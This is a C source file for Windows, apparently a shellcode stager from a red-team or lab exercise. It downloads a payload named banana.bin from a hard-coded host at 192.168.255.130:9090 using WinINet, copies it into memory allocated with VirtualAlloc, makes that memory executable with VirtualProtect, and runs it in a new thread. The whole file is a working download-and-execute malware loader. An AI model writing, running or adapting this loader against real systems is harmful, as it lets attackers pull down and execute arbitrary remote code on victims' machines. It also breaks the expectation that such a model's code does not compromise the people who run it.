#include <stdio.h>
#include <windows.h>
#include <wininet.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

int stage(unsigned char* buffer, size_t buffer_size) {
    DWORD bytes = 0;  // Initialize bytes

    HINTERNET hSession = InternetOpen(
        "Banana",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0
    );

    if (hSession == NULL) {
        warn("Failed to open internet connection (Error Code: %lu)", GetLastError());
        return EXIT_FAILURE;
    }

    HINTERNET hConnect = InternetOpenUrlW(
        hSession,
        L"http://192.168.255.130:9090/banana.bin",
        NULL,
        0,
        INTERNET_FLAG_RELOAD,
        0
    );

    if (hConnect == NULL) {
        warn("Failed to fetch request (Error Code: %lu)", GetLastError());
        InternetCloseHandle(hSession);
        return EXIT_FAILURE;
    }


    BOOL hRead = InternetReadFile(
        hConnect,
        buffer,
        buffer_size,
        &bytes);

    if (hRead == FALSE) {
      warn("Failed to read data Error Code: %lu)", GetLastError());
    }

    // Close the handles
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
    return EXIT_SUCCESS;
}

int main() {
    unsigned char buffer[510];
    size_t buffer_size = sizeof(buffer);
    DWORD old_protect;
    DWORD change_protect;
    void* execute_memory;

    stage(buffer, buffer_size);
    printf("%s\n", buffer);

    // VirtualAlloc
    execute_memory = VirtualAlloc(
        NULL,
        buffer_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (execute_memory == NULL) {
        warn("Failed to allocate memory %d\n", GetLastError());
        return 1;
    }

    // RtlMoveMemory
    RtlMoveMemory(
        execute_memory,
        buffer,
        buffer_size
    );

    okay("Memory allocated at: %p\n with READWRITE", execute_memory);

    // VirtualProtect
    change_protect = VirtualProtect(
        execute_memory,
        buffer_size,
        PAGE_EXECUTE_READ,
        &old_protect
    );

    if (change_protect == 0) {
        warn("Failed to change memory permissions %d\n", GetLastError());
        return 1;
    }

    okay("Memory protection changed to EXECUTE_READ");

    // CreateThread
    HANDLE thread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)execute_memory,
        NULL,
        0,
        NULL
    );

    if (thread == NULL) {
        warn("CreateThread failed with error %d\n", GetLastError());
        return 1;
    }

    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);

    return EXIT_SUCCESS;
}
